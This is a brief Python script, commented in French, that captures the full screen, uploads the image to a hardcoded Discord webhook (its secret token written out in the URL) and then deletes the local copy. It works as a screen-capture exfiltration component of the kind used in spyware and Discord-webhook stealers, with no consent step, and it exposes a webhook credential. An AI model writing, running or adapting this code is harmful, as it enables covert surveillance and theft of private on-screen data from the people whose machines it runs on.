import requests
from PIL import ImageGrab
import os

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1450922309891391652/j_WkuEvDxWSNpICu5KBccsK1r4-nfRrIfZatPGyUPTQRWAQ9C0EZ3YXu2v5XgStzodPd"
FILE_NAME = "temp_screen.png"

def send_screenshot():
    try:
        # 1. Capture de l'écran
        screenshot = ImageGrab.grab()
        screenshot.save(FILE_NAME)

        # 2. Préparation et envoi vers Discord
        with open(FILE_NAME, "rb") as f:
            payload = {
                "content": "📸 **Nouvelle capture d'écran reçue !**"
            }
            files = {
                "file": (FILE_NAME, f)
            }
            
            response = requests.post(WEBHOOK_URL, data=payload, files=files)

        # 3. Vérification du succès
        if response.status_code == 200 or response.status_code == 204:
            print("Capture envoyée avec succès !")
        else:
            print(f"Erreur lors de l'envoi : {response.status_code}")

    except Exception as e:
        print(f"Une erreur est survenue : {e}")

    finally:
        # 4. Nettoyage : suppression du fichier image
        if os.path.exists(FILE_NAME):
            os.remove(FILE_NAME)

if __name__ == "__main__":
    send_screenshot()
